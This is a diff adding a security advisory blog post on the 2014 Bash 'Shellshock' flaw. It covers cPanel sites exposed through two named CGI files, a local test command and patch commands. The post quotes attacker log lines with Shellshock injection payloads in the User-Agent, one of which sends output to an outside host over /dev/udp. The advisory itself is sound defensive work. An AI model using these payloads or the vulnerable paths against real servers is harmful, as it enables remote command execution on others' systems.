@@ -1,0 +1,56 @@
+Bash Vulnerability – Shell Shock – Thousands of cPanel Sites are High Risk
+
+The team behind the Bash project (the most common shell used on Linux) recently issued a patch for a serious vulnerability that could allow for remote command execution on servers running the vulnerable bash versions.
+Wait, remote command execution on bash? You are likely asking yourself, “How can someone remotely execute commands on a local shell?”
+The issue starts with mod_cgi and how web servers interact with CGI programs (that could be written in Perl, PHP, Shell scripting or any other language). The web server passes (environment) user variables to them so they can do their work. In simple terms, this vulnerability allows an attacker to pass a command as a variable that gets executed by bash.
+It means that if you are using mod_cgi on your webserver and you have a CGI written in shell script, you are in deep trouble. Drop everything now and patch your servers.
+If you have CGI’s written on any other language, but you are using “system()”, “(backticks)” or executing any commands from the CGI, you are in deep trouble. Drop everything now and patch your servers.
+If you don’t know what you have, Drop everything now and patch your servers.
+
+Who is Vulnerable?
+Almost every server in the Internet is vulnerable to it (every server has Bash). But not all sites are actually exploitable.
+I mean, who really still uses mod_cgi instead of mod_php/fast_cgi that would be safe? Or who would write a CGI in shell scripting?
+cPanel Users at Risk
+Well, turns out cPanel does that for some of their internal tools.
+As we started to scan our clients sites (and the Internet as a whole) we found that about 2.9% of all sites we scanned were vulnerable to this problem. All of them were running cPanel and had these 2 files available:
+
+/cgi-sys/entropysearch.cgi
+/cgi-sys/FormMail-clone.cgi
+
+When we talk about millions of websites online, 2.9% is a lot. Just from our investigation, we found thousands of websites vulnerable and easily compromised.
+If you are using cPanel, you have to patch your servers right away (or remove these files from the server)!
+For Sucuri clients, sites behind our Website Firewall / WAF are already protected against it, but we still recommend patching.
+Attacks in the Wild
+We are seeing many scans for this vulnerability in the wild, but mostly coming from security researchers trying to understand the severity of it (nothing really bad yet). So far, these two IP addresses (166.78.61.142, 24.251.197.244) are hitting every site they can, trying to trigger the vulnerability
+
+166.78.61.142 – – [25/Sep/2014:06:28:47 -0400] “GET / HTTP/1.1” 200 193 “-” “() { :;}; echo shellshock-scan > /dev/udp/pwn.nixon-security.se/4444”
+24.251.197.244 – – [25/Sep/2014:07:49:36 -0400] “GET / HTTP/1.1” 200 193 “-” “() { :; }; echo -e x22Content-Type: text/plainx5Cnx22; echo qQQQQQq”
+
+We have not detected any massive scans looking for real CGI that would be vulnerable (that’s where the problem lies).
+Even if you are using mod_php for your web application (like WordPress or Joomla), you have to make sure that mod_cgi is not enabled for things like your cPanel backend, Plesk, or any other management tool.
+In a few more days we will see real scans and actual attacks attempting to exploit this Shell Shock vulnerability.
+NIX System Administrators
+You’re in luck with this one, identifying if you’re vulnerable is easier than previous vulnerabilities. Log into your server and via terminal run this command:
+
+[root@yourawesomeserver ~]# env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+
+If you are vulnerable it will return:
+
+[root@yourawesomeserver ~]# env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+vulnerable
+hello
+
+To fix it will depend on your NIX distribution but you will want to reinstall or update, whichever you prefer:
+
+#sudo apt-get install bash
+
+- or -
+
+#sudo yum update bash
+
+Once complete, rerun the test and you will get:
+
+[root@yourawesomeserver ~]# env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+bash: warning: x: ignoring function definition attempt
+bash: error importing function definition for `x'
+hello
